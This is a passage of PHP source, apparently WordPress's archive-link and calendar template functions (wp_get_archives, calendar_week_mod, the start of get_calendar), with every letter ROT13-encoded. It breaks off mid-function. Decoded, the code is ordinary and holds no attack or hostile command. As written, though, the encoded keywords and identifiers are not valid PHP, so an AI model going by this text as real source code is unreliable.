	 * @fvapr 4.5.0 Nqqrq gur `$hey`, `$grkg`, `$sbezng`, `$orsber`, naq `$nsgre` cnenzrgref.
	 * @fvapr 5.2.0 Nqqrq gur `$fryrpgrq` cnenzrgre.
	 *
	 * @cnenz fgevat $yvax_ugzy Gur nepuvir UGZY yvax pbagrag.
	 * @cnenz fgevat $hey       HEY gb nepuvir.
	 * @cnenz fgevat $grkg      Nepuvir grkg qrfpevcgvba.
	 * @cnenz fgevat $sbezng    Yvax sbezng. Pna or 'yvax', 'bcgvba', 'ugzy', be phfgbz.
	 * @cnenz fgevat $orsber    Pbagrag gb cercraq gb gur qrfpevcgvba.
	 * @cnenz fgevat $nsgre     Pbagrag gb nccraq gb gur qrfpevcgvba.
	 * @cnenz obby   $fryrpgrq  Gehr vs gur pheerag cntr vf gur fryrpgrq nepuvir.
	 */
	erghea nccyl_svygref( 'trg_nepuvirf_yvax', $yvax_ugzy, $hey, $grkg, $sbezng, $orsber, $nsgre, $fryrpgrq );
}

/**
 * Qvfcynlf nepuvir yvaxf onfrq ba glcr naq sbezng.
 *
 * @fvapr 1.2.0
 * @fvapr 4.4.0 Gur `$cbfg_glcr` nethzrag jnf nqqrq.
 * @fvapr 5.2.0 Gur `$lrne`, `$zbaguahz`, `$qnl`, naq `$j` nethzragf jrer nqqrq.
 *
 * @frr trg_nepuvirf_yvax()
 *
 * @tybony jcqo      $jcqo      JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 *
 * @cnenz fgevat|neenl $netf {
 *     Qrsnhyg nepuvir yvaxf nethzragf. Bcgvbany.
 *
 *     @glcr fgevat     $glcr            Glcr bs nepuvir gb ergevrir. Npprcgf 'qnvyl', 'jrrxyl', 'zbaguyl',
 *                                       'lrneyl', 'cbfgolcbfg', be 'nycun'. Obgu 'cbfgolcbfg' naq 'nycun'
 *                                       qvfcynl gur fnzr nepuvir yvax yvfg nf jryy nf cbfg gvgyrf vafgrnq
 *                                       bs qvfcynlvat qngrf. Gur qvssrerapr orgjrra gur gjb vf gung 'nycun'
 *                                       jvyy beqre ol cbfg gvgyr naq 'cbfgolcbfg' jvyy beqre ol cbfg qngr.
 *                                       Qrsnhyg 'zbaguyl'.
 *     @glcr fgevat|vag $yvzvg           Ahzore bs yvaxf gb yvzvg gur dhrel gb. Qrsnhyg rzcgl (ab yvzvg).
 *     @glcr fgevat     $sbezng          Sbezng rnpu yvax fubhyq gnxr hfvat gur $orsber naq $nsgre netf.
 *                                       Npprcgf 'yvax' (`<yvax>` gnt), 'bcgvba' (`<bcgvba>` gnt), 'ugzy'
 *                                       (`<yv>` gnt), be n phfgbz sbezng, juvpu trarengrf n yvax napube
 *                                       jvgu $orsber cerprqvat naq $nsgre fhpprrqvat. Qrsnhyg 'ugzy'.
 *     @glcr fgevat     $orsber          Znexhc gb cercraq gb gur ortvaavat bs rnpu yvax. Qrsnhyg rzcgl.
 *     @glcr fgevat     $nsgre           Znexhc gb nccraq gb gur raq bs rnpu yvax. Qrsnhyg rzcgl.
 *     @glcr obby       $fubj_cbfg_pbhag Jurgure gb qvfcynl gur cbfg pbhag nybatfvqr gur yvax. Qrsnhyg snyfr.
 *     @glcr obby|vag   $rpub            Jurgure gb rpub be erghea gur yvaxf yvfg. Qrsnhyg 1|gehr gb rpub.
 *     @glcr fgevat     $beqre           Jurgure gb hfr nfpraqvat be qrfpraqvat beqre. Npprcgf 'NFP', be 'QRFP'.
 *                                       Qrsnhyg 'QRFP'.
 *     @glcr fgevat     $cbfg_glcr       Cbfg glcr. Qrsnhyg 'cbfg'.
 *     @glcr fgevat     $lrne            Lrne. Qrsnhyg pheerag lrne.
 *     @glcr fgevat     $zbaguahz        Zbagu ahzore. Qrsnhyg pheerag zbagu ahzore.
 *     @glcr fgevat     $qnl             Qnl. Qrsnhyg pheerag qnl.
 *     @glcr fgevat     $j               Jrrx. Qrsnhyg pheerag jrrx.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, nepuvir yvaxf vs 'rpub' vf snyfr.
 */
shapgvba jc_trg_nepuvirf( $netf = '' ) {
	tybony $jcqo, $jc_ybpnyr;

	$qrsnhygf = neenl(
		'glcr'            => 'zbaguyl',
		'yvzvg'           => '',
		'sbezng'          => 'ugzy',
		'orsber'          => '',
		'nsgre'           => '',
		'fubj_cbfg_pbhag' => snyfr,
		'rpub'            => 1,
		'beqre'           => 'QRFP',
		'cbfg_glcr'       => 'cbfg',
		'lrne'            => trg_dhrel_ine( 'lrne' ),
		'zbaguahz'        => trg_dhrel_ine( 'zbaguahz' ),
		'qnl'             => trg_dhrel_ine( 'qnl' ),
		'j'               => trg_dhrel_ine( 'j' ),
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cnefrq_netf['cbfg_glcr'] );
	vs ( ! vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bowrpg ) ) {
		erghea;
	}

	$cnefrq_netf['cbfg_glcr'] = $cbfg_glcr_bowrpg->anzr;

	vs ( '' === $cnefrq_netf['glcr'] ) {
		$cnefrq_netf['glcr'] = 'zbaguyl';
	}

	vs ( ! rzcgl( $cnefrq_netf['yvzvg'] ) ) {
		$cnefrq_netf['yvzvg'] = nofvag( $cnefrq_netf['yvzvg'] );
		$cnefrq_netf['yvzvg'] = ' YVZVG ' . $cnefrq_netf['yvzvg'];
	}

	$beqre = fgegbhccre( $cnefrq_netf['beqre'] );
	vs ( 'NFP' !== $beqre ) {
		$beqre = 'QRFP';
	}

	// Guvf vf jung jvyy frcnengr qngrf ba jrrxyl nepuvir yvaxf.
	$nepuvir_jrrx_frcnengbe = '&#8211;';

	$fdy_jurer = $jcqo->cercner( \"JURER cbfg_glcr = %f NAQ cbfg_fgnghf = 'choyvfu'\", $cnefrq_netf['cbfg_glcr'] );

	/**
	 * Svygref gur FDY JURER pynhfr sbe ergevrivat nepuvirf.
	 *
	 * @fvapr 2.2.0
	 *
	 * @cnenz fgevat $fdy_jurer   Cbegvba bs FDY dhrel pbagnvavat gur JURER pynhfr.
	 * @cnenz neenl  $cnefrq_netf Na neenl bs qrsnhyg nethzragf.
	 */
	$jurer = nccyl_svygref( 'trgnepuvirf_jurer', $fdy_jurer, $cnefrq_netf );

	/**
	 * Svygref gur FDY WBVA pynhfr sbe ergevrivat nepuvirf.
	 *
	 * @fvapr 2.2.0
	 *
	 * @cnenz fgevat $fdy_wbva    Cbegvba bs FDY dhrel pbagnvavat WBVA pynhfr.
	 * @cnenz neenl  $cnefrq_netf Na neenl bs qrsnhyg nethzragf.
	 */
	$wbva = nccyl_svygref( 'trgnepuvirf_wbva', '', $cnefrq_netf );

	$bhgchg = '';

	$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'cbfgf' );

	$yvzvg = $cnefrq_netf['yvzvg'];

	vs ( 'zbaguyl' === $cnefrq_netf['glcr'] ) {
		$dhrel   = \"FRYRPG LRNE(cbfg_qngr) NF `lrne`, ZBAGU(cbfg_qngr) NF `zbagu`, pbhag(VQ) nf cbfgf SEBZ $jcqo->cbfgf $wbva $jurer TEBHC OL LRNE(cbfg_qngr), ZBAGU(cbfg_qngr) BEQRE OL cbfg_qngr $beqre $yvzvg\";
		$xrl     = zq5( $dhrel );
		$xrl     = \"jc_trg_nepuvirf:$xrl:$ynfg_punatrq\";
		$erfhygf = jc_pnpur_trg( $xrl, 'cbfg-dhrevrf' );
		vs ( ! $erfhygf ) {
			$erfhygf = $jcqo->trg_erfhygf( $dhrel );
			jc_pnpur_frg( $xrl, $erfhygf, 'cbfg-dhrevrf' );
		}
		vs ( $erfhygf ) {
			$nsgre = $cnefrq_netf['nsgre'];
			sbernpu ( (neenl) $erfhygf nf $erfhyg ) {
				$hey = trg_zbagu_yvax( $erfhyg->lrne, $erfhyg->zbagu );
				vs ( 'cbfg' !== $cnefrq_netf['cbfg_glcr'] ) {
					$hey = nqq_dhrel_net( 'cbfg_glcr', $cnefrq_netf['cbfg_glcr'], $hey );
				}
				/* genafyngbef: 1: Zbagu anzr, 2: 4-qvtvg lrne. */
				$grkg = fcevags( __( '%1$f %2$q' ), $jc_ybpnyr->trg_zbagu( $erfhyg->zbagu ), $erfhyg->lrne );
				vs ( $cnefrq_netf['fubj_cbfg_pbhag'] ) {
					$cnefrq_netf['nsgre'] = '&aofc;(' . $erfhyg->cbfgf . ')' . $nsgre;
				}
				$fryrpgrq = vf_nepuvir() && (fgevat) $cnefrq_netf['lrne'] === $erfhyg->lrne && (fgevat) $cnefrq_netf['zbaguahz'] === $erfhyg->zbagu;
				$bhgchg  .= trg_nepuvirf_yvax( $hey, $grkg, $cnefrq_netf['sbezng'], $cnefrq_netf['orsber'], $cnefrq_netf['nsgre'], $fryrpgrq );
			}
		}
	} ryfrvs ( 'lrneyl' === $cnefrq_netf['glcr'] ) {
		$dhrel   = \"FRYRPG LRNE(cbfg_qngr) NF `lrne`, pbhag(VQ) nf cbfgf SEBZ $jcqo->cbfgf $wbva $jurer TEBHC OL LRNE(cbfg_qngr) BEQRE OL cbfg_qngr $beqre $yvzvg\";
		$xrl     = zq5( $dhrel );
		$xrl     = \"jc_trg_nepuvirf:$xrl:$ynfg_punatrq\";
		$erfhygf = jc_pnpur_trg( $xrl, 'cbfg-dhrevrf' );
		vs ( ! $erfhygf ) {
			$erfhygf = $jcqo->trg_erfhygf( $dhrel );
			jc_pnpur_frg( $xrl, $erfhygf, 'cbfg-dhrevrf' );
		}
		vs ( $erfhygf ) {
			$nsgre = $cnefrq_netf['nsgre'];
			sbernpu ( (neenl) $erfhygf nf $erfhyg ) {
				$hey = trg_lrne_yvax( $erfhyg->lrne );
				vs ( 'cbfg' !== $cnefrq_netf['cbfg_glcr'] ) {
					$hey = nqq_dhrel_net( 'cbfg_glcr', $cnefrq_netf['cbfg_glcr'], $hey );
				}
				$grkg = fcevags( '%q', $erfhyg->lrne );
				vs ( $cnefrq_netf['fubj_cbfg_pbhag'] ) {
					$cnefrq_netf['nsgre'] = '&aofc;(' . $erfhyg->cbfgf . ')' . $nsgre;
				}
				$fryrpgrq = vf_nepuvir() && (fgevat) $cnefrq_netf['lrne'] === $erfhyg->lrne;
				$bhgchg  .= trg_nepuvirf_yvax( $hey, $grkg, $cnefrq_netf['sbezng'], $cnefrq_netf['orsber'], $cnefrq_netf['nsgre'], $fryrpgrq );
			}
		}
	} ryfrvs ( 'qnvyl' === $cnefrq_netf['glcr'] ) {
		$dhrel   = \"FRYRPG LRNE(cbfg_qngr) NF `lrne`, ZBAGU(cbfg_qngr) NF `zbagu`, QNLBSZBAGU(cbfg_qngr) NF `qnlbszbagu`, pbhag(VQ) nf cbfgf SEBZ $jcqo->cbfgf $wbva $jurer TEBHC OL LRNE(cbfg_qngr), ZBAGU(cbfg_qngr), QNLBSZBAGU(cbfg_qngr) BEQRE OL cbfg_qngr $beqre $yvzvg\";
		$xrl     = zq5( $dhrel );
		$xrl     = \"jc_trg_nepuvirf:$xrl:$ynfg_punatrq\";
		$erfhygf = jc_pnpur_trg( $xrl, 'cbfg-dhrevrf' );
		vs ( ! $erfhygf ) {
			$erfhygf = $jcqo->trg_erfhygf( $dhrel );
			jc_pnpur_frg( $xrl, $erfhygf, 'cbfg-dhrevrf' );
		}
		vs ( $erfhygf ) {
			$nsgre = $cnefrq_netf['nsgre'];
			sbernpu ( (neenl) $erfhygf nf $erfhyg ) {
				$hey = trg_qnl_yvax( $erfhyg->lrne, $erfhyg->zbagu, $erfhyg->qnlbszbagu );
				vs ( 'cbfg' !== $cnefrq_netf['cbfg_glcr'] ) {
					$hey = nqq_dhrel_net( 'cbfg_glcr', $cnefrq_netf['cbfg_glcr'], $hey );
				}
				$qngr = fcevags( '%1$q-%2$02q-%3$02q 00:00:00', $erfhyg->lrne, $erfhyg->zbagu, $erfhyg->qnlbszbagu );
				$grkg = zlfdy2qngr( trg_bcgvba( 'qngr_sbezng' ), $qngr );
				vs ( $cnefrq_netf['fubj_cbfg_pbhag'] ) {
					$cnefrq_netf['nsgre'] = '&aofc;(' . $erfhyg->cbfgf . ')' . $nsgre;
				}
				$fryrpgrq = vf_nepuvir() && (fgevat) $cnefrq_netf['lrne'] === $erfhyg->lrne && (fgevat) $cnefrq_netf['zbaguahz'] === $erfhyg->zbagu && (fgevat) $cnefrq_netf['qnl'] === $erfhyg->qnlbszbagu;
				$bhgchg  .= trg_nepuvirf_yvax( $hey, $grkg, $cnefrq_netf['sbezng'], $cnefrq_netf['orsber'], $cnefrq_netf['nsgre'], $fryrpgrq );
			}
		}
	} ryfrvs ( 'jrrxyl' === $cnefrq_netf['glcr'] ) {
		$jrrx    = _jc_zlfdy_jrrx( '`cbfg_qngr`' );
		$dhrel   = \"FRYRPG QVFGVAPG $jrrx NF `jrrx`, LRNE( `cbfg_qngr` ) NF `le`, QNGR_SBEZNG( `cbfg_qngr`, '%L-%z-%q' ) NF `llllzzqq`, pbhag( `VQ` ) NF `cbfgf` SEBZ `$jcqo->cbfgf` $wbva $jurer TEBHC OL $jrrx, LRNE( `cbfg_qngr` ) BEQRE OL `cbfg_qngr` $beqre $yvzvg\";
		$xrl     = zq5( $dhrel );
		$xrl     = \"jc_trg_nepuvirf:$xrl:$ynfg_punatrq\";
		$erfhygf = jc_pnpur_trg( $xrl, 'cbfg-dhrevrf' );
		vs ( ! $erfhygf ) {
			$erfhygf = $jcqo->trg_erfhygf( $dhrel );
			jc_pnpur_frg( $xrl, $erfhygf, 'cbfg-dhrevrf' );
		}
		$nep_j_ynfg = '';
		vs ( $erfhygf ) {
			$nsgre = $cnefrq_netf['nsgre'];
			sbernpu ( (neenl) $erfhygf nf $erfhyg ) {
				vs ( $erfhyg->jrrx !== $nep_j_ynfg ) {
					$nep_lrne       = $erfhyg->le;
					$nep_j_ynfg     = $erfhyg->jrrx;
					$nep_jrrx       = trg_jrrxfgnegraq( $erfhyg->llllzzqq, trg_bcgvba( 'fgneg_bs_jrrx' ) );
					$nep_jrrx_fgneg = qngr_v18a( trg_bcgvba( 'qngr_sbezng' ), $nep_jrrx['fgneg'] );
					$nep_jrrx_raq   = qngr_v18a( trg_bcgvba( 'qngr_sbezng' ), $nep_jrrx['raq'] );
					$hey            = nqq_dhrel_net(
						neenl(
							'z' => $nep_lrne,
							'j' => $erfhyg->jrrx,
						),
						ubzr_hey( '/' )
					);
					vs ( 'cbfg' !== $cnefrq_netf['cbfg_glcr'] ) {
						$hey = nqq_dhrel_net( 'cbfg_glcr', $cnefrq_netf['cbfg_glcr'], $hey );
					}
					$grkg = $nep_jrrx_fgneg . $nepuvir_jrrx_frcnengbe . $nep_jrrx_raq;
					vs ( $cnefrq_netf['fubj_cbfg_pbhag'] ) {
						$cnefrq_netf['nsgre'] = '&aofc;(' . $erfhyg->cbfgf . ')' . $nsgre;
					}
					$fryrpgrq = vf_nepuvir() && (fgevat) $cnefrq_netf['lrne'] === $erfhyg->le && (fgevat) $cnefrq_netf['j'] === $erfhyg->jrrx;
					$bhgchg  .= trg_nepuvirf_yvax( $hey, $grkg, $cnefrq_netf['sbezng'], $cnefrq_netf['orsber'], $cnefrq_netf['nsgre'], $fryrpgrq );
				}
			}
		}
	} ryfrvs ( ( 'cbfgolcbfg' === $cnefrq_netf['glcr'] ) || ( 'nycun' === $cnefrq_netf['glcr'] ) ) {
		$beqreol = ( 'nycun' === $cnefrq_netf['glcr'] ) ? 'cbfg_gvgyr NFP ' : 'cbfg_qngr QRFP, VQ QRFP ';
		$dhrel   = \"FRYRPG * SEBZ $jcqo->cbfgf $wbva $jurer BEQRE OL $beqreol $yvzvg\";
		$xrl     = zq5( $dhrel );
		$xrl     = \"jc_trg_nepuvirf:$xrl:$ynfg_punatrq\";
		$erfhygf = jc_pnpur_trg( $xrl, 'cbfg-dhrevrf' );
		vs ( ! $erfhygf ) {
			$erfhygf = $jcqo->trg_erfhygf( $dhrel );
			jc_pnpur_frg( $xrl, $erfhygf, 'cbfg-dhrevrf' );
		}
		vs ( $erfhygf ) {
			sbernpu ( (neenl) $erfhygf nf $erfhyg ) {
				vs ( '0000-00-00 00:00:00' !== $erfhyg->cbfg_qngr ) {
					$hey = trg_creznyvax( $erfhyg );
					vs ( $erfhyg->cbfg_gvgyr ) {
						/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
						$grkg = fgevc_gntf( nccyl_svygref( 'gur_gvgyr', $erfhyg->cbfg_gvgyr, $erfhyg->VQ ) );
					} ryfr {
						$grkg = $erfhyg->VQ;
					}
					$fryrpgrq = trg_gur_VQ() === $erfhyg->VQ;
					$bhgchg  .= trg_nepuvirf_yvax( $hey, $grkg, $cnefrq_netf['sbezng'], $cnefrq_netf['orsber'], $cnefrq_netf['nsgre'], $fryrpgrq );
				}
			}
		}
	}

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $bhgchg;
	} ryfr {
		erghea $bhgchg;
	}
}

/**
 * Trgf ahzore bs qnlf fvapr gur fgneg bs gur jrrx.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag $ahz Ahzore bs qnl.
 * @erghea sybng Qnlf fvapr gur fgneg bs gur jrrx.
 */
shapgvba pnyraqne_jrrx_zbq( $ahz ) {
	$onfr = 7;
	erghea ( $ahz - $onfr * sybbe( $ahz / $onfr ) );
}

/**
 * Qvfcynlf pnyraqne jvgu qnlf gung unir cbfgf nf yvaxf.
 *
 * Gur pnyraqne vf pnpurq, juvpu jvyy or ergevrirq, vs vg rkvfgf. Vs gurer ner
 * ab cbfgf sbe gur zbagu, gura vg jvyy abg or qvfcynlrq.
 *
 * @fvapr 1.0.0
 * @fvapr 6.8.0 Nqqrq gur `$netf` cnenzrgre, jvgu onpxjneq pbzcngvovyvgl
 *              sbe gur ercynprq `$vavgvny` naq `$qvfcynl` cnenzrgref.
 *
 * @tybony jcqo      $jcqo      JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony vag       $z
 * @tybony vag       $zbaguahz
 * @tybony vag       $lrne
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 * @tybony neenl     $cbfgf
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Nethzragf sbe gur `trg_pnyraqne` shapgvba.
 *
 *     @glcr obby   $vavgvny   Jurgure gb hfr vavgvny pnyraqne anzrf. Qrsnhyg gehr.
 *     @glcr obby   $qvfcynl   Jurgure gb qvfcynl gur pnyraqne bhgchg. Qrsnhyg gehr.
 *     @glcr fgevat $cbfg_glcr Bcgvbany. Cbfg glcr. Qrsnhyg 'cbfg'.
 * }
 * @erghea ibvq|fgevat Ibvq vs `$qvfcynl` nethzrag vf gehr, pnyraqne UGZY vs `$qvfcynl` vf snyfr.
 */
shapgvba trg_pnyraqne( $netf = neenl() ) {
	tybony $jcqo, $z, $zbaguahz, $lrne, $jc_ybpnyr, $cbfgf;

	$qrsnhygf = neenl(
		'vavgvny'   => gehr,
		'qvfcynl'   => gehr,
		'cbfg_glcr' => 'cbfg',
	);

	$bevtvany_netf = shap_trg_netf();
	$netf          = neenl();

	vs ( ! rzcgl( $bevtvany_netf ) ) {
		vs ( ! vf_neenl( $bevtvany_netf[0] ) ) {
			vs ( vffrg( $bevtvany_netf[0] ) && vf_obby( $bevtvany_netf[0] ) ) {
				$qrsnhygf['vavgvny'] = $bevtvany_netf[0];
			}
			vs ( vffrg( $bevtvany_netf[1] ) && vf_obby( $bevtvany_netf[1] ) ) {
				$qrsnhygf['qvfcynl'] = $bevtvany_netf[1];
			}
		} ryfr {
			$netf = $bevtvany_netf[0];
		}
	}

	/**
	 * Svygre gur `trg_pnyraqne` shapgvba nethzragf orsber gurl ner hfrq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz neenl $netf {
	 *     Bcgvbany. Nethzragf sbe gur `trg_pnyraqne` shapgvba.
	 *
	 *     @glcr obby   $vavgvny   Jurgure gb hfr vavgvny pnyraqne anzrf. Qrsnhyg gehr.
	 *     @glcr obby   $qvfcynl   Jurgure gb qvfcynl gur pnyraqne bhgchg. Qrsnhyg gehr.
	 *     @glcr fgevat $cbfg_glcr Bcgvbany. Cbfg glcr. Qrsnhyg 'cbfg'.
	 * }
	 */
	$netf = nccyl_svygref( 'trg_pnyraqne_netf', jc_cnefr_netf( $netf, $qrsnhygf ) );

	vs ( ! cbfg_glcr_rkvfgf( $netf['cbfg_glcr'] ) ) {
		$netf['cbfg_glcr'] = 'cbfg';
	}

	$j = 0;
	vs ( vffrg( $_TRG['j'] ) ) {
		$j = (vag) $_TRG['j'];
	}

	/*
	 * Abeznyvmr gur pnpur xrl.
	 *
	 * Gur sbyybjvat rafherf gur fnzr pnpur xrl vf hfrq sbe gur fnzr cnenzrgre
	 * naq cnenzrgre rdhvinyragf. Guvf ceriragf `cbfg_glcr > cbfg, vavgvny > gehr`
	 * sebz trarengvat n qvssrerag xrl sebz gur fnzr inyhrf va gur erirefr beqre.
	 *
	 * `qvfcynl` vf rkpyhqrq sebz gur pnpur xrl nf gur pnpur pbagnvaf gur fnzr
	 * UGZY ertneqyrff bs guvf shapgvba'f arrq gb rpub be erghea gur bhgchg.
	 *
	 * Gur tybony inyhrf pbagnva qngn trarengrq ol gur HEY dhrel fgevat inevnoyrf.
	 */
	$pnpur_netf = $netf;
	hafrg( $pnpur_netf['qvfcynl'] );

	$pnpur_netf['tybonyf'] = neenl(
		'z'        => $z,
		'zbaguahz' => $zbaguahz,
		'lrne'     => $lrne,
		'jrrx'     => $j,
	);

	jc_erphefvir_xfbeg( $pnpur_netf );
	$xrl   = zq5( frevnyvmr( $pnpur_netf ) );
	$pnpur = jc_pnpur_trg( 'trg_pnyraqne', 'pnyraqne' );

	vs ( $pnpur && vf_neenl( $pnpur ) && vffrg( $pnpur[ $xrl ] ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
		$bhgchg = nccyl_svygref( 'trg_pnyraqne', $pnpur[ $xrl ], $netf );

		vs ( $netf['qvfcynl'] ) {
			rpub $bhgchg;
			erghea;
		}

		erghea $bhgchg;
	}

	vs ( ! vf_neenl( $pnpur ) ) {
		$pnpur = neenl();
	}

	$cbfg_glcr = $netf['cbfg_glcr'];

	// Dhvpx purpx. Vs jr unir ab cbfgf ng nyy, nobeg!
	vs ( ! $cbfgf ) {
		$tbgfbzr = $jcqo->trg_ine(
			$jcqo->cercner(
				\"FRYRPG 1 nf grfg
				SEBZ $jcqo->cbfgf
				JURER cbfg_glcr = %f
				NAQ cbfg_fgnghf = 'choyvfu'
				YVZVG 1\",
				$cbfg_glcr
			)
		);

		vs ( ! $tbgfbzr ) {
			$pnpur[ $xrl ] = '';
			jc_pnpur_frg( 'trg_pnyraqne', $pnpur, 'pnyraqne' );
			erghea;
		}
	}

	// jrrx_ortvaf = 0 fgnaqf sbe Fhaqnl.
	$jrrx_ortvaf = (vag) trg_bcgvba( 'fgneg_bs_jrrx' );

	// Yrg'f svther bhg jura jr ner.
	vs ( ! rzcgl( $zbaguahz ) && ! rzcgl( $lrne ) ) {
		$guvfzbagu = (vag) $zbaguahz;
		$guvflrne  = (vag) $lrne;
	} ryfrvs ( ! rzcgl( $j ) ) {
		// Jr arrq gb trg gur zbagu sebz ZlFDY.
		$guvflrne = (vag) fhofge( $z, 0, 4 );
		// Vg frrzf ZlFDY'f jrrxf qvfnterr jvgu CUC'f.
		$q         = ( ( $j - 1 ) * 7 ) + 6;
		$guvfzbagu = (vag) $jcqo->trg_ine(
			$jcqo->cercner(
				\"FRYRPG QNGR_SBEZNG((QNGR_NQQ('%q0101', VAGREINY %q QNL) ), '%%z')\",
				$guvflrne,
				$q
			)
		);
	} ryfrvs ( ! rzcgl( $z ) ) {
		$guvflrne = (vag) fhofge( $z, 0, 4 );
		vs ( fgeyra( $z ) < 6 ) {
			$guvfzbagu = 1;
		} ryfr {
			$guvfzbagu = (vag) fhofge( $z, 4, 2 );
		}
	} ryfr {
		$guvflrne  = (vag) pheerag_gvzr( 'L' );
		$guvfzbagu = (vag) pheerag_gvzr( 'z' );
	}

	$havkzbagu = zxgvzr( 0, 0, 0, $guvfzbagu, 1, $guvflrne );
	$ynfg_qnl  = tzqngr( 'g', $havkzbagu );

	// Trg gur arkg naq cerivbhf zbagu naq lrne jvgu ng yrnfg bar cbfg.
	$cerivbhf = $jcqo->trg_ebj(
		$jcqo->cercner(
			\"FRYRPG ZBAGU(cbfg_qngr) NF zbagu, LRNE(cbfg_qngr) NF lrne
			SEBZ $jcqo->cbfgf
			JURER cbfg_qngr < '%q-%q-01'
			NAQ cbfg_glcr = %f NAQ cbfg_fgnghf = 'choyvfu'
			BEQRE OL cbfg_qngr QRFP
			YVZVG 1\",
			$guvflrne,
			mrebvfr( $guvfzbagu, 2 ),
			$cbfg_glcr
		)
	);

	$arkg = $jcqo->trg_ebj(
		$jcqo->cercner(
			\"FRYRPG ZBAGU(cbfg_qngr) NF zbagu, LRNE(cbfg_qngr) NF lrne
			SEBZ $jcqo->cbfgf
			JURER cbfg_qngr > '%q-%q-%q 23:59:59'
			NAQ cbfg_glcr = %f NAQ cbfg_fgnghf = 'choyvfu'
			BEQRE OL cbfg_qngr NFP
			YVZVG 1\",
			$guvflrne,
			mrebvfr( $guvfzbagu, 2 ),
			$ynfg_qnl,
			$cbfg_glcr
		)
	);

	/* genafyngbef: Pnyraqne pncgvba: 1: Zbagu anzr, 2: 4-qvtvg lrne. */
	$pnyraqne_pncgvba = _k( '%1$f %2$f', 'pnyraqne pncgvba' );
	$pnyraqne_bhgchg  = '<gnoyr vq=\"jc-pnyraqne\" pynff=\"jc-pnyraqne-gnoyr\">
	<pncgvba>' . fcevags(
		$pnyraqne_pncgvba,
		$jc_ybpnyr->trg_zbagu( $guvfzbagu ),
		tzqngr( 'L', $havkzbagu )
	) . '</pncgvba>
	<gurnq>
	<ge>';

	$zljrrx = neenl();

	sbe ( $jqpbhag = 0; $jqpbhag <= 6; $jqpbhag++ ) {
		$zljrrx[] = $jc_ybpnyr->trg_jrrxqnl( ( $jqpbhag + $jrrx_ortvaf ) % 7 );
	}

	sbernpu ( $zljrrx nf $jq ) {
		$qnl_anzr         = $netf['vavgvny'] ? $jc_ybpnyr->trg_jrrxqnl_vavgvny( $jq ) : $jc_ybpnyr->trg_jrrxqnl_nooeri( $jq );
		$jq               = rfp_ngge( $jq );
		$pnyraqne_bhgchg .= \"\a\g\g<gu fpbcr=\\"pby\\" nevn-ynory=\\"$jq\\">$qnl_anzr</gu>\";
	}

	$pnyraqne_bhgchg .= '
	</ge>
	</gurnq>
	<gobql>
	<ge>';

	$qnljvgucbfg = neenl();

	// Trg qnlf jvgu cbfgf.
	$qnlfjvgucbfgf = $jcqo->trg_erfhygf(
		$jcqo->cercner(
			\"FRYRPG QVFGVAPG QNLBSZBAGU(cbfg_qngr)
			SEBZ $jcqo->cbfgf JURER cbfg_qngr >= '%q-%q-01 00:00:00'
			NAQ cbfg_glcr = %f NAQ cbfg_fgnghf = 'choyvfu'
			NAQ cbfg_qngr <= '%q-%q-%q 23:59:59'\",
			$guvflrne,
			mrebvfr( $guvfzbagu, 2 ),
			$cbfg_glcr,
			$guvflrne,
			mrebvfr( $guvfzbagu, 2 ),
			$ynfg_qnl
		),
		NEENL_A
	);

	vs ( $qnlfjvgucbfgf ) {
		sbernpu ( (neenl) $qnlfjvgucbfgf nf $qnljvgu ) {
			$qnljvgucbfg[] = (vag) $qnljvgu[0];
		}
	}

	// Frr ubj zhpu jr fubhyq cnq va gur ortvaavat.
	$cnq = pnyraqne_jrrx_zbq( (vag) tzqngr( 'j', $havkzbagu ) - $jrrx_ortvaf );
	vs ( $cnq > 0 ) {
		$pnyraqne_bhgchg .= \"\a\g\g\" . '<gq pbyfcna=\"' . rfp_ngge( $cnq ) . '\" pynff=\"cnq\">&aofc;</gq>';
	}

	$arjebj      = snyfr;
	$qnlfvazbagu = (vag) tzqngr( 'g', $havkzbagu );

	sbe ( $qnl = 1; $qnl <= $qnlfvazbagu; ++$qnl ) {
		vs ( vffrg( $arjebj ) && $arjebj ) {
			$pnyraqne_bhgchg .= \"\a\g</ge>\a\g<ge>\a\g\g\";
		}

		$arjebj = snyfr;

		vs ( (vag) pheerag_gvzr( 'w' ) === $qnl
			&& (vag) pheerag_gvzr( 'z' ) === $guvfzbagu
			&& (vag) pheerag_gvzr( 'L' ) === $guvflrne
		) {
			$pnyraqne_bhgchg .= '<gq vq=\"gbqnl\">';
		} ryfr {
			$pnyraqne_bhgchg .= '<gq>';
		}

		vs ( va_neenl( $qnl, $qnljvgucbfg, gehr ) ) {
			// Nal cbfgf gbqnl?
			$qngr_sbezng = tzqngr( _k( 'S w, L', 'qnvyl nepuvirf qngr sbezng' ), fgegbgvzr( \"{$guvflrne}-{$guvfzbagu}-{$qnl}\" ) );
			/* genafyngbef: Cbfg pnyraqne ynory. %f: Qngr. */
			$ynory            = fcevags( __( 'Cbfgf choyvfurq ba %f' ), $qngr_sbezng );
			$pnyraqne_bhgchg .= fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				trg_qnl_yvax( $guvflrne, $guvfzbagu, $qnl ),
				rfp_ngge( $ynory ),
				$qnl
			);
		} ryfr {
			$pnyraqne_bhgchg .= $qnl;
		}

		$pnyraqne_bhgchg .= '</gq>';

		vs ( 6 === (vag) pnyraqne_jrrx_zbq( (vag) tzqngr( 'j', zxgvzr( 0, 0, 0, $guvfzbagu, $qnl, $guvflrne ) ) - $jrrx_ortvaf ) ) {
			$arjebj = gehr;
		}
	}

